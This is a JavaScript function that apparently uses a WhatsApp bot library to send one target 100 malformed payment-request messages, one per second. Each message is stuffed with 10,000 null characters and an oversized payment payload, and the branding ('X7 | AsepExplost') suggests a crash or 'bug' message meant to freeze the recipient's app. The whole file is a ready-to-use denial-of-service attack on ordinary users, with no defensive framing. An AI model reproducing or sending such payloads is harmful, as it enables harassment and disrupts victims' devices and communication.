async function PaymentOneMsgX7(sock, target) {
  for (var r = 0; r < 100; r++) {

    let msg = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: {
                text: "X7 | AsepExplost"
              },

              nativeFlowMessage: {
                messageParamsJson: "\0".repeat(10000),

                buttons: [
                  {
                    name: "payment_method",

                    buttonParamsJson:
                      "{\"currency\":\"XXX\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":1000000,\"offset\":100},\"reference_id\":\"4SWMDTS1PY4\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"description\":\"\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b\",\"name\":\"D | 7eppeli-Exploration\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":1}]},\"additional_note\":\"D | 7eppeli-Exploration\",\"native_payment_methods\":[],\"share_payment_status\":false}"
                  }
                ],

                messageParamsJson: "\0".repeat(10000)
              },

              contextInfo: {
                quotedMessage: {
                  paymentInviteMessage: {
                    serviceType: 2,
                    expiryTimestamp:
                      Math.floor(Date.now() / 1000) + 86400
                  }
                }
              }
            }
          }
        }
      },
      {}
    );

    await sock.relayMessage(
      target,
      msg.message,
      {
        messageId: msg.key.id,
        participant: { jid: target }
      }
    );

    await sleep(1000);
  }
}
